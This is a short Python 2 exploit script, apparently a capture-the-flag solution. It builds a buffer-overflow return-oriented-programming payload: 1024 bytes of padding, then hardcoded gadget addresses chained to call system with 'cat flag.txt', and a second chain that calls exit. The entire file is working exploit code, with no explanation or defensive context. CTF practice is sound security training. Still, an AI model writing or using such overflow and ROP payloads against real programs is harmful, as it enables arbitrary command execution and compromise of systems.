import struct

g5 = 0x4006d1
g4 = 0x4006d0
g3 = 0x4006d3
g1 = 0x4006d1
g2 = 0x4006da
g = 0x601040 - 0x10

#Calling System
payload = 'A'*1024
payload+= '.txt\x00\x00\x00\x00'  + struct.pack('<Q', g1) + struct.pack("<Q", g)+struct.pack('<Q',g2) 
payload+= struct.pack("<Q", 163456) + struct.pack('<Q',g5) +struct.pack('<Q',16)  
payload+= struct.pack('<Q', g3) + 'cat flag.txt\x00\x00\x00\x00'  + struct.pack('<Q', g4) + struct.pack('<Q', 0x400530)

#payload+='A'*8
#Calling exit
payload+= struct.pack('<Q', g1) + struct.pack('<Q', g) + struct.pack('<Q', g2)
payload+= struct.pack("<Q", 41904) + struct.pack('<Q',g5) 
payload+= struct.pack('<Q',0) + struct.pack('<Q', 0x400530)
print payload
